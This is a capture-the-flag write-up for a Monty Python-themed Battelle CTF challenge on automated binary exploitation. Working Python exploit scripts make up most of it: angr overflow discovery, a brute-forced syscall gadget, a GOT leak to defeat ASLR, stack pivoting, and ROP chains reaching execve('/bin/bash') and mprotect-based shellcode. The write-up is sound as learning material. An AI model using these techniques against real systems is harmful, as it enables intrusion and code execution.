```
A Møøse once bit my sister... No realli! She was Karving her initials on the møøse with the sharpened end of an interspace tøøthbrush given her by Svenge - her brother-in-law - an Oslo dentist and star of many Norwegian møvies "The Høt Hands of an Oslo Dentist", "Fillings of Passion", "The Huge Mølars of Horst Nordfink"...

nc ctf.battelle.org 30042 

Hint: To pwn a binary find the function “holy_grail” and call it
```

# recon

Unlike many pwn challenges, this had no binary to be downloaded. The reason why quickly became clear when we connected to the provided service and it dropped an ELF binary. 

```
❯  nc ctf.battelle.org 30042
To get to the holy grail you must answer three questions...
Or... The same question 3 times.
WHAT?
Monty Python and The Holy Grail quote am I thinking of?
Oh yea and you have to find 3 holy grails... Wait was it 3 or 5?********************************
EL4!4 hDDPQ/lib/ld-linux.so.2GNUGNYMɥ	 	K0` "D<)5
V                                                        libc.so.6_IO_stdin_usedstrncmpstrlenmemsetreadstdoutsetvbuf__libc_start_mainGLIBC_2.0__gmon_start__ii
...
 $$ h 0h ) 
********************************
SHE'S A WITCH BURN HER!
```
The binary wasn't in a format which could easily be made into a file first thing I did was construct a brief script to connect and write the binary to a file for further analysis. 

```python
from pwn import *
import time

context.terminal = ['kitty','-e']

r = remote("ctf.battelle.org", 30042)

r.recvuntil(b"********************************")
r.recvline()
with open("binary1", "wb") as f:
	f.write(r.recvuntil(b"********************************\n"))
```

The main function is pretty minimal; only calling two functions.

```c
void FUN_08048516(void) {
  setvbuf(stdout,(char *)0x0,0,0);
  return;
}
```

The first disables buffering on stdout, common in CTF challenges over a TCP socket like this because buffering can make exploits behave strangely. 

```c
void FUN_08048579(void) {
  size_t __n;
  int iVar1;
  char local_31 [33];
  char *local_10;
  
  local_10 = "A SHRUBBERRY!!!!";
  memset(local_31,0,0x21);
  read(0,local_31,0x1d);
  __n = strlen(PTR_s_We_have_no_shrubberies_here!_0804b02c);
  iVar1 = strncmp(PTR_s_We_have_no_shrubberies_here!_0804b02c,local_31,__n);
  if (iVar1 == 0) {
    FUN_080485fb();
  }
  else {
    FUN_0804867d();
  }
  return;
}
```

The second reads from stdin, compares it to a static string, and then branches based on the equality. Each branch calls another function which does essentially the same thing, forming a tree of functions, and then finally there are "leaf" functions which do not call other functions at all. 

```c
void FUN_08048ad7(void) {
  size_t __n;
  char local_18 [8];
  char *local_10;
  
  local_10 = "Your Mother was a Hamster, and your Father smelt of Elderberries!";
  memset(local_18,0,8);
  read(0,local_18,0xe0);
  __n = strlen(PTR_DAT_0804b058);
  strncmp(PTR_DAT_0804b058,local_18,__n);
  return;
}
```

While looking through the stripped functions I saw a buffer overflow in one of the leaf functions. At this point the rough shape of the challenge is becoming clear. Subsequent connections to the service provide binaries which follow the same archetype but are subtly different -- strings, buffer sizes, etc differ. We need to write code to generate an exploit in a generic enough manner that it will work for any binary the server provides. 

# automatic exploitation

I used angr to generate exploiting payloads for these binaries. I would love to have created this myself, but I was able to pretty much wholesale snag a script from [a blog post on discovering buffer overflows with angr](https://breaking-bits.gitbook.io/breaking-bits/vulnerability-discovery/automated-exploit-development/buffer-overflows)

```python
import angr, argparse
from pwn import *

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("Binary")

    args = parser.parse_args()

    TARGET = "DCBA"

    p = angr.Project(args.Binary)
    state = p.factory.blank_state()
    
    simgr = p.factory.simgr(state, save_unconstrained=True)
    simgr.stashes['mem_corrupt']  = []
    
    def check_mem_corruption(simgr):
        if len(simgr.unconstrained):
            for path in simgr.unconstrained:
                if path.satisfiable(extra_constraints=[path.regs.pc == TARGET]):
                    path.add_constraints(path.regs.pc == TARGET)
                    if path.satisfiable():
                        simgr.stashes['mem_corrupt'].append(path)
                    simgr.stashes['unconstrained'].remove(path)
                    simgr.drop(stash='active')
        return simgr

    simgr.explore(step_func=check_mem_corruption)
    if len(simgr.stashes['mem_corrupt']) == 0:
        print("could not derive corrupting payload :(")
        exit(1)
    else:
        dump = simgr.stashes['mem_corrupt'][0].posix.dumps(0)
        f.write(dump[:dump.index(b"ABCD")-4])
            
if __name__ == "__main__":
    main()
```

This script took a binary as an argument, attempted to derive a corrupting payload, and then wrote it to a file for my usage elsewhere. 

# read -> syscall

So, we have a decent (but variable) sized buffer overflow. Where do we go from here? 

```
[*] '/home/sky/battelle-ctf-2021/holy_grail_rop/binary1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Mitigations are pretty light -- NX is enabled but it lacks a canary and PIE is disabled. Usually in this scenario I would reach for ret2libc, but ASLR makes that troublesome in this situation because we have no easy method of leaking a libc pointer. On the bright side, no PIE means we can easily pivot the stack into BSS. 

```
❯ nm --dynamic ./binary1
         w __gmon_start__
08048d3c R _IO_stdin_used
         U __libc_start_main@GLIBC_2.0
         U memset@GLIBC_2.0
         U read@GLIBC_2.0
         U setvbuf@GLIBC_2.0
         U stdout@GLIBC_2.0
         U strlen@GLIBC_2.0
         U strncmp@GLIBC_2.0
```

We have access to a pretty slim set of libc functions, none of which write to stdout. Interestingly enough there is an stdout symbol, from buffering being disabled, but I do not believe that to be exploitable. 

I was stuck at this point for ages trying to think up a viable exploit method when I noticed something interesting about the disassembly of read. 

```
gef➤  disas read
Dump of assembler code for function read:
   0xf7e8b850 <+0>:	endbr32 
   0xf7e8b854 <+4>:	push   edi
   0xf7e8b855 <+5>:	push   esi
   0xf7e8b856 <+6>:	call   0xf7edff15 <__x86.get_pc_thunk.si>
   0xf7e8b85b <+11>:	add    esi,0xfa5c1
   0xf7e8b861 <+17>:	push   ebx
   0xf7e8b862 <+18>:	sub    esp,0x10
   0xf7e8b865 <+21>:	mov    eax,gs:0xc
   0xf7e8b86b <+27>:	test   eax,eax
   0xf7e8b86d <+29>:	jne    0xf7e8b898 <read+72>
   0xf7e8b86f <+31>:	mov    ebx,DWORD PTR [esp+0x20]
   0xf7e8b873 <+35>:	mov    ecx,DWORD PTR [esp+0x24]
   0xf7e8b877 <+39>:	mov    eax,0x3
   0xf7e8b87c <+44>:	mov    edx,DWORD PTR [esp+0x28]
   0xf7e8b880 <+48>:	call   DWORD PTR gs:0x10
   ...
```
At read+48 there is an [instruction which performs a syscall](https://stackoverflow.com/questions/41690592/what-does-gs0x10-do-in-assembler) and more importantly this is quite close to the beginning of the function so there is a pretty decent chance the difference between read+0 and read+48 is *only the last byte*. This is vitally important because ASLR does not randomize the lowest 12 bytes which means the value of this byte on the server is constant. If we can figure out what this byte is on the server, we can transmute read into a syscall gadget which can be leveraged for information leakage. 

As it turns out, constructing a ROP chain which can utilize a syscall gadget to leak information in this binary is nontrivial. My original plan was to use sigreturn to set the argument registers, but that turned out to not work because it clobbered the segment registers (genuinely unsure why because I don't think it should; let me know if you're reading this and you know why). I managed to make a rop chain capable of leaking a single byte by leveraging leftover register values from read, an INC ECX gadget, and a "mov al, 4; or byte ptr [ecx], al; leave; ret" gadget (I later improved on this rop chain to be able to leak larger ranges, but this worked to brute force this byte). 

I wrote up a quick script to brute force overwrite the last byte and apply this ROP chain. The theory was that if the overwrite was correct, read would become a syscall gadget and I would see an extra byte in the response. 

(this was pretty much my earliest functional script; see later ones if you want comments :) )
```python
from pwn import *
import time

bss = 0x0804b068
import multiprocessing
semaphore = multiprocessing.Semaphore(1)
file_semaphore = multiprocessing.Semaphore(1)

def try_byte(syscall_gadget_no):
    try:
        syscall_gadget = p8(syscall_gadget_no)
        with semaphore:
            print(f"trying {syscall_gadget_no} - {syscall_gadget}")

        r = remote("ctf.battelle.org", 30042)

        r.recvuntil(b"********************************")
        r.recvline()
        with open("binary1", "wb") as f:
            f.write(r.recvuntil(b"********************************"))

        process(["python", "detect_vuln2.py", "binary1"]).recvall()

        exe = ELF("./binary1")
        POP_EBX_RET = 0x08048371
        INC_ECX_RET = next(exe.search(b"\x41\xc3"))

        pivot_payload = b""

        pivot_payload += p32(bss + len(pivot_payload) + 4) + b"/bin/bash".ljust(16,b"\x00")
        as_for_strlen_start = bss + len(pivot_payload)
        pivot_payload += p32(bss + len(pivot_payload) + 4) + b"A"*(150)

        pivot_payload += p32(0x0804b14a-4)

        chain_start = bss + len(pivot_payload)

        pivot_chain = ROP(exe)

        pivot_chain.read(0, exe.got['read'], 1)
        pivot_chain.raw(pivot_chain.ebx[0])
        pivot_chain.raw(1)
        for i in range(4):
            pivot_chain.raw(INC_ECX_RET)
        pivot_chain.raw(0x080484f7) # mov ax, 4 gadget
        for i in range(4):
            pivot_chain.raw(INC_ECX_RET)
        pivot_chain.raw(exe.symbols['read'])

        log.info("pivot chain created")

        pivot_payload += pivot_chain.chain()

        rop = ROP(exe)
        rop.read(0, bss, len(pivot_payload))
        rop.raw(0x08048485)

        raw_rop = rop.chain()
        log.info("original chain created")


        with open("payload.bin","rb") as f:
            r.send(f.read() + p32(chain_start-4) + raw_rop)
            time.sleep(1)
            r.send(pivot_payload)
            time.sleep(1)
            r.send(syscall_gadget)
        received = r.recvall()
        with file_semaphore:
            with open("brute.log", "a") as f:
                f.write(f"{syscall_gadget_no} -> {received}\n")
        with semaphore:
            print(f"finishing {syscall_gadget_no} - {received}")
        return (syscall_gadget_no, received)
    except:
        try_byte(syscall_gadget_no)

from multiprocessing import Pool

pool = Pool(4)

with open("result.log", "w") as f:
    for (a,b) in pool.map(try_byte, range(256)):
        f.write(f"{syscall_gadget_no} -> {received}\n")
```

This turned out to work fine (although it was quite close to the end, I was getting a little scared) and I discovered that 244 (0xf4) was the correct byte to overwrite with to construct a syscall gadget. 

```
230 -> b"\nSHE'S A WITCH BURN HER!\n"
244 -> b"\nPSHE'S A WITCH BURN HER!\n"
245 -> b"\nSHE'S A WITCH BURN HER!\n"
```
Once I discovered how to leak a single byte, I leaked individual bytes of the GOT by varying the number of INC ECX gadgets to determine the lower 12 bits of \_\_libc\_start\_main (0xa50) and setvbuf (0x700). I then used [libc.rip](https://libc.rip/) to determine that the libc version on remote was libc6-i386_2.28-10_amd64. 

# getting a shell!

At this point I had all the building blocks necessary to get a shell, I just needed to refine and put it together. The key difference between my earlier rop chain and the chain I used to get a shell was the size of my information leak. I lacked any gadgets to control edx directly, so I was left to rely on whatever had previously set it -- in this case the read call I used to turn read into a syscall gadget. Naively, this left 1 in edx because I was overwriting a single byte.  I realized I could take advantage of the fact that read length is a *maximum* and it will happily read fewer bytes if that is all that is present. I adjusted it to read 4 bytes (a full word leak) and then dropped a time.sleep after sending only a single byte to force read to return early. 

Putting this into action got me a total ASLR leak, allowing me to return to libc with 100% success (more or less, I got the odd connection error)

```python
from pwn import *
import time, angr, logging

logging.getLogger('angr').setLevel('ERROR')
logging.getLogger('claripy').setLevel('ERROR')

context.terminal = ['kitty','-e']

r = remote("ctf.battelle.org", 30042)

r.recvuntil(b"********************************")
r.recvline()
with open("current_binary", "wb") as f:
    f.write(r.recvuntil(b"********************************\n"))


p = angr.Project("current_binary")
state = p.factory.blank_state()

simgr = p.factory.simgr(state, save_unconstrained=True)
simgr.stashes['mem_corrupt']  = []

def check_mem_corruption(simgr):
    if len(simgr.unconstrained):
        for path in simgr.unconstrained:
            if path.satisfiable(extra_constraints=[path.regs.pc == "ABCD"]):
                path.add_constraints(path.regs.pc == "ABCD")
                if path.satisfiable():
                    simgr.stashes['mem_corrupt'].append(path)
                simgr.stashes['unconstrained'].remove(path)
                simgr.drop(stash='active')
    return simgr

simgr.explore(step_func=check_mem_corruption)
if len(simgr.stashes['mem_corrupt']) == 0:
    log.warn("could not find memory corrupting input")
    exit(1)
corrupting = simgr.stashes['mem_corrupt'][0].posix.dumps(0)
payload = corrupting[:corrupting.index(b"DCBA")-4]

pivoted_stack_1 = 0x0804b068 # start of bss + enough to not clobber important stuff

exe = ELF("./current_binary")


POP_EBX_RET = 0x08048371
POP_EBX_RET = 0x08048371
MOV_AX_4 = 0x080484f7
# above gadgets are constant
POP_EBP_RET = next(exe.search(b"\x5d\xc3"))
INC_ECX_RET = next(exe.search(b"\x41\xc3"))
LEAVE_RET = next(exe.search(b"\xc9\xc3"))
RET = next(exe.search(b"\xc3"))

# the first thing we want to do is pivot the stack
# we're gonna have to commit some sins to get this to work and limited rop chain size isn't gonna do it
pivot_payload = b""
pivot_payload += p32(0x0804b09c-4)

pivot_chain = ROP(exe)
# step 1 is to overwrite the last byte of the read pointer
# I used length to leave 4 in edx for a later write because read can receive fewer than len bytes
pivot_chain.read(0, exe.got['read'], 4)
# Step 2 is to write a pointer out of the GOT, allowing me to break ASLR and determine the version of libc on the server
# ebx/file descriptor can be set by pop ebx gadget but we need to be more inventive for other arguments
pivot_chain.raw(pivot_chain.ebx[0])
pivot_chain.raw(1)
# ecx is already the GOT entry of read because we read over the entry
# we lack any easy pointers to control ECX but we can increment it four times to switch to the next entry in the GOT
for i in range(4):
    pivot_chain.raw(INC_ECX_RET)
# to write with a syscall gadget we need eax == 4
# the only gadget I could find to do so is mov al, 4; or byte ptr [ecx], al; leave; ret; 
# ecx at this point is the GOT entry to strlen which we can comfortably clobber because it is no longer needed
pivot_chain.raw(MOV_AX_4)
# we then increment ECX again to leak __libc_start_main
for i in range(4):
    pivot_chain.raw(INC_ECX_RET)
# and lastly we call "read" which is actually a syscall gadget
pivot_chain.raw(exe.symbols['read'])

# to finish out this rop chain we need to set up for the next stage of this exploit
# we will need to construct another rop chain with our new knowledge of libc base
# 7 null words are garbage values which are consumed between read's syscall and ret
for i in range(7):
    pivot_chain.raw(0)
# these ret gadgets make the stack pointer far enough from the base that calling into the dynamic linker will not segfault
# i ran into issues with it segfaulting because it hit the base of bss
for i in range(100):
    pivot_chain.raw(RET)
# and lastly we use the plt stub to convince the dynamic linker into retrieving the original read pointer
# allowing us to read again and inject a second rop chain
# we're reading 11 * 4 bytes (size of the second pivot stack) into a location in the bss slightly after our previous rop chain ends
pivot_chain.call(0x8048396, [0, 0x0804b260, 11 * 4])
log.info("pivot chain created")
log.info(pivot_chain.dump())

pivot_payload += pivot_chain.chain()
pivot_payload += p32(pivoted_stack_1 + len(pivot_payload) + 4) + b"/bin/bash".ljust(16,b"\x00")

rop = ROP(exe)
rop.read(0, pivoted_stack_1, len(pivot_payload))
rop.raw(LEAVE_RET)
# we override the stored ebp with pivoted_stack_1 so this will copy ebp, esp and adjust the stack to the new location
# we previously read an arbitrarily large rop chain to that area
log.info("first chain created")
log.info(rop.dump())

r.send(payload + p32(pivoted_stack_1) + rop.chain())
time.sleep(1)
r.send(pivot_payload)
time.sleep(1)
r.send(p8(244))
time.sleep(1)


libc_base = u32(r.recv(4)) - 0x0001aa50 # offset of __libc_start_main

log.info(f"leaked libc_base @ {hex(libc_base)}")


execve = libc_base + 0x000c0470
mprotect = libc_base + 0x000f5940
read = libc_base + 0x000e7ea0

# the second rop chain is created with knowledge of libc base
# so no need to do anything tricky with read
pivot_chain_2 = ROP(exe)
pivot_chain_2.call(execve, [0x0804b274, 0, 0]) # location of /bin/bash in bss
log.info("created second pivot chain")
log.info(pivot_chain_2.dump())
r.send(pivot_chain_2.chain())
r.send("whoami")

r.interactive()
```

As some careful enumeration of the box showed (very careful because I got about 10 seconds before the timeout kicked me) it was missing several important binaries (/bin/sh, cat, etc). It did, luckily, have ls which showed me the contents of the working directory. 

```
bin
dev
exec_8c24169a11a765ad7302322dc13b8917.bin
hint.txt
lib
lib32
lib64
log
usr
```

The most interesting one is hint.txt -- I had assumed that getting a shell wouldn't be sufficient because there are mentions of having to exploit multiple binaries and calling the symbol "holy_grail" which did not exist in the binary. The text of this hint tells us that it is linked with "libgrail.so" using LD_PRELOAD. 


```
Congrats! You we're supposed to find this!

Here's your hint

Your binary was invoked like this

LD_PRELOAD=/lib32/libgrail.so ./bin
```
This likely contains the aforementioned "holy_grail" symbol which needs to be called to win. I exfiltrated it with base64 (love that binary, dropping static binaries on boxes you really aren't supposed to have them with base64 is a quality strat) and found the following function. 

```c
void holy_grail(void)

{
  int __fd;
  size_t __n;
  
  __fd = open("./log",2);
  __n = strlen("DONE\n");
  write(__fd,"DONE\n",__n);
  close(__fd);
                    /* WARNING: Subroutine does not return */
  exit(0x2c);
}
```

I learned from an admin that the intended solution was [ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve) -- the binary had no plt stub for this function so it couldn't be called directly, but if you forged one the linker would happily fetch a pointer to this function for you. 

I, being incredibly lazy, chose to just fake this function by writing DONE to the log file in my rop chain. sorry ;)

# tying it all together

As I had an 100% accurate ret2libc chain it didn't take much to finish up the challenge. I modified the end of my chain to mprotect and write shellcode which mimicked the holy grail function, wrapped it in a loop, and let it run. 


```python
from pwn import *
import time, angr, logging

logging.getLogger('angr').setLevel('ERROR')
logging.getLogger('claripy').setLevel('ERROR')

context.terminal = ['kitty','-e']

r = remote("ctf.battelle.org", 30042)

for i in range(5):
    log.info(f"solving binary {i}")
    r.recvuntil(b"********************************")
    r.recvline()
    with open("current_binary", "wb") as f:
        f.write(r.recvuntil(b"********************************\n"))

    p = angr.Project("current_binary")
    state = p.factory.blank_state()

    simgr = p.factory.simgr(state, save_unconstrained=True)
    simgr.stashes['mem_corrupt']  = []
    
    def check_mem_corruption(simgr):
        if len(simgr.unconstrained):
            for path in simgr.unconstrained:
                if path.satisfiable(extra_constraints=[path.regs.pc == "ABCD"]):
                    path.add_constraints(path.regs.pc == "ABCD")
                    if path.satisfiable():
                        simgr.stashes['mem_corrupt'].append(path)
                    simgr.stashes['unconstrained'].remove(path)
                    simgr.drop(stash='active')
        return simgr

    simgr.explore(step_func=check_mem_corruption)
    if len(simgr.stashes['mem_corrupt']) == 0:
        log.warn("could not find memory corrupting input")
        exit(1)
    corrupting = simgr.stashes['mem_corrupt'][0].posix.dumps(0)
    payload = corrupting[:corrupting.index(b"DCBA")-4]

    pivoted_stack_1 = 0x0804b068 # start of bss + enough to not clobber important stuff

    exe = ELF("./current_binary")


    POP_EBX_RET = 0x08048371
    POP_EBX_RET = 0x08048371
    MOV_AX_4 = 0x080484f7
    # above gadgets are constant
    POP_EBP_RET = next(exe.search(b"\x5d\xc3"))
    INC_ECX_RET = next(exe.search(b"\x41\xc3"))
    LEAVE_RET = next(exe.search(b"\xc9\xc3"))
    RET = next(exe.search(b"\xc3"))

    # the first thing we want to do is pivot the stack
    # we're gonna have to commit some sins to get this to work and limited rop chain size isn't gonna do it
    pivot_payload = b""
    pivot_payload += p32(0x0804b09c-4)

    pivot_chain = ROP(exe)
    # step 1 is to overwrite the last byte of the read pointer
    # I used length to leave 4 in edx for a later write because read can receive fewer than len bytes
    pivot_chain.read(0, exe.got['read'], 4)
    # Step 2 is to write a pointer out of the GOT, allowing me to break ASLR and determine the version of libc on the server
    # ebx/file descriptor can be set by pop ebx gadget but we need to be more inventive for other arguments
    pivot_chain.raw(pivot_chain.ebx[0])
    pivot_chain.raw(1)
    # ecx is already the GOT entry of read because we read over the entry
    # we lack any easy pointers to control ECX but we can increment it four times to switch to the next entry in the GOT
    for i in range(4):
        pivot_chain.raw(INC_ECX_RET)
    # to write with a syscall gadget we need eax == 4
    # the only gadget I could find to do so is mov al, 4; or byte ptr [ecx], al; leave; ret; 
    # ecx at this point is the GOT entry to strlen which we can comfortably clobber because it is no longer needed
    pivot_chain.raw(MOV_AX_4)
    # we then increment ECX again to leak __libc_start_main
    for i in range(4):
        pivot_chain.raw(INC_ECX_RET)
    # and lastly we call "read" which is actually a syscall gadget
    pivot_chain.raw(exe.symbols['read'])

    # to finish out this rop chain we need to set up for the next stage of this exploit
    # we will need to construct another rop chain with our new knowledge of libc base
    # 7 null words are garbage values which are consumed between read's syscall and ret
    for i in range(7):
        pivot_chain.raw(0)
    # these ret gadgets make the stack pointer far enough from the base that calling into the dynamic linker will not segfault
    # i ran into issues with it segfaulting because it hit the base of bss
    for i in range(100):
        pivot_chain.raw(RET)
    # and lastly we use the plt stub to convince the dynamic linker into retrieving the original read pointer
    # allowing us to read again and inject a second rop chain
    # we're reading 11 * 4 bytes (size of the second pivot stack) into a location in the bss slightly after our previous rop chain ends
    pivot_chain.call(0x8048396, [0, 0x0804b260, 11 * 4])
    log.info("pivot chain created")
    log.info(pivot_chain.dump())

    pivot_payload += pivot_chain.chain()
    pivot_payload += p32(pivoted_stack_1 + len(pivot_payload) + 4) + b"/bin/bash".ljust(16,b"\x00")

    rop = ROP(exe)
    rop.read(0, pivoted_stack_1, len(pivot_payload))
    rop.raw(LEAVE_RET)
    # we override the stored ebp with pivoted_stack_1 so this will copy ebp, esp and adjust the stack to the new location
    # we previously read an arbitrarily large rop chain to that area
    log.info("first chain created")
    log.info(rop.dump())

    r.send(payload + p32(pivoted_stack_1) + rop.chain())
    time.sleep(1)
    r.send(pivot_payload)
    time.sleep(1)
    r.send(p8(244))
    time.sleep(1)


    libc_base = u32(r.recv(4)) - 0x0001aa50 # offset of __libc_start_main

    log.info(f"leaked libc_base @ {hex(libc_base)}")


    execve = libc_base + 0x000c0470
    mprotect = libc_base + 0x000f5940
    read = libc_base + 0x000e7ea0

    shellcode = b""
    shellcode += asm(shellcraft.i386.linux.open("./log", 2))
    shellcode += asm(shellcraft.i386.linux.echo("DONE\n",sock="eax"))
    shellcode += asm(shellcraft.i386.linux.exit(0x2c))
    

    shellcode_loc = 0x0804b284+8 # just took the end of the rop chain and added a bit so they wouldn't run over each other

    # the second rop chain is created with knowledge of libc base
    # so no need to do anything tricky with read
    # I just call mprotect to make bss rwx, write shellcode, and then return to it
    pivot_chain_2 = ROP(exe)
    pivot_chain_2.call(mprotect, [0x0804b000, 0x2000, 7])
    pivot_chain_2.call(read, [0, shellcode_loc, len(shellcode)])
    pivot_chain_2.raw(shellcode_loc)
    log.info("created second pivot chain")
    log.info(pivot_chain_2.dump())
    r.send(pivot_chain_2.chain())
    r.send(shellcode)

r.interactive()
```

```
YOU FOUND THE HOLY GRAIL!
flag{Y0u_f1g4t_w311_sir_knig4t_7461834}
```